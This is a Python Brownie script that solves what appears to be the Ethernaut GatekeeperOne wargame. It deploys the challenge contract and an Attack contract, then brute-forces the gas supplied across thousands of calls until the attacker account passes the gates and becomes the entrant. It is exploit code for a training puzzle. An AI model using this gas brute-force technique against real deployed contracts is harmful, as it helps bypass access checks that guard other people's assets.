from brownie import network, GatekeeperOne, Attack, chain
from brownie.network import gas_price
from scripts.helpful import get_account, LOCAL_NETWORKS
from brownie.network.gas.strategies import LinearScalingStrategy
import web3


def deploy_gatekeepper(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = GatekeeperOne.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --GatekeeperOne-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_attack(contract_address, account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Attack.deploy(
        contract_address, {"from": account}, publish_source=publish
    )
    print(
        f"Cotntract --Attack-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    contract_gatekeeper = deploy_gatekeepper(owner_account)
    print(f"Owner address: {owner_account.address}")
    print(f"Attacker address: {attacker_account.address}")
    print(f"Gatekeepper owner: {contract_gatekeeper.entrant()}")
    contract_attacker = deploy_attack(contract_gatekeeper.address, attacker_account)
    # tx = contract_attacker.attack
    try:
        tx = contract_attacker.attack({"gas": 1000000})
        tx.wait(1)
    except:
        pass
    print(f"Gatekeepper owner: {contract_gatekeeper.entrant()}")
    for i in range(9000):
        solver = 99000
        solver += i

        try:
            tx = contract_attacker.attack({"gas": solver})
            tx.wait(1)
        except:
            pass
        print(f"Gatekeepper owner: {contract_gatekeeper.entrant()}, count: {i}")
        # print(contract_gatekeeper.remGas())
        # if contract_gatekeeper.remGas() % 8191 == 0:
        #     print(f"PASSED:{i},   {solver}")
        #     break
        if contract_gatekeeper.entrant() == attacker_account.address:
            break
    print(f"Gatekeepper owner: {contract_gatekeeper.entrant()}")


if __name__ == "__main__":
    main()
